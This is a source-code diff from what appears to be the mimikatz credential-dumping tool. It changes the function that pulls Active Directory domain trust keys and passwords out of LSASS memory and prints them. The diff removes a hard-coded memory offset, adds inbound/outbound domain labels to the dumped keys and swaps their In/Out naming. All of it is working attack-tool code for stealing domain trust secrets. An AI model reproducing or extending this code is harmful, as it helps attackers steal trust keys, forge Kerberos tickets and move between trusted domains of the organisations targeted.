@@ -542,7 +542,6 @@ NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 			{
 				if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, DomainListReferences, ARRAYSIZE(DomainListReferences), &aLsass.address, NULL, NULL))
 				{
-					aLsass.address = (PBYTE) kuhl_m_sekurlsa_kdcsvc_package.Module.Informations.DllBase.address + ((cLsass.osContext.MinorVersion < 3) ? 0x64D40 : 0x7F600);
 					if(kull_m_memory_copy(&data, &aLsass, sizeof(PVOID)))
 					{
 						data.address = buffer;
@@ -566,7 +565,7 @@ NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 	return status;
 }
 
-void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCWSTR prefix)
+void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCWSTR prefix, BOOL incoming, PCUNICODE_STRING domain)
 {
 	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aLsass = {keysInfo->keys, cLsass.hLsassMem}, aData = {NULL, &hBuffer};
@@ -575,10 +574,11 @@ void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, P
 
 	if((keysInfo->keysSize && keysInfo->keys) || (keysInfo->password.Length && keysInfo->password.Buffer))
 	{
-		kprintf(L"\n  [%s]", prefix);
+		kprintf(L"\n  [%s] ", prefix);
+		kprintf(incoming ? L"-> %wZ\n" : L"%wZ ->\n", domain);
 		if(kull_m_string_getUnicodeString(&keysInfo->password, cLsass.hLsassMem))
 		{
-			kprintf(L" from: ");
+			kprintf(L"\tfrom: ");
 			if(kull_m_string_suspectUnicodeString(&keysInfo->password))
 				kprintf(L"%wZ", &keysInfo->password);
 			else kull_m_string_wprintf_hex(keysInfo->password.Buffer, keysInfo->password.Length, 1);
@@ -619,11 +619,10 @@ void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
 				LocalFree(info->DomainSid);
 			}
 			kprintf(L")\n");
-			//kprintf(L"%u / %u / %u / %u - %p - %u\n", info->unk1, info->unk2, info->unk3, info->unk4, info->unk5, info->unk6);
-			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingAuthenticationKeys, L"  In ");
-			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingAuthenticationKeys, L" Out ");
-			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingPreviousAuthenticationKeys, L" In-1");
-			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingPreviousAuthenticationKeys, L"Out-1");
+			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingAuthenticationKeys, L" Out ", FALSE, &info->FullDomainName);	// Input keys are for Out relation ship...
+			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingAuthenticationKeys, L"  In ", TRUE, &info->FullDomainName);
+			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingPreviousAuthenticationKeys, L"Out-1", FALSE, &info->FullDomainName);
+			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingPreviousAuthenticationKeys, L" In-1", TRUE, &info->FullDomainName);
 			LocalFree(info->NetBiosName.Buffer);
 		}
 		LocalFree(info->FullDomainName.Buffer);
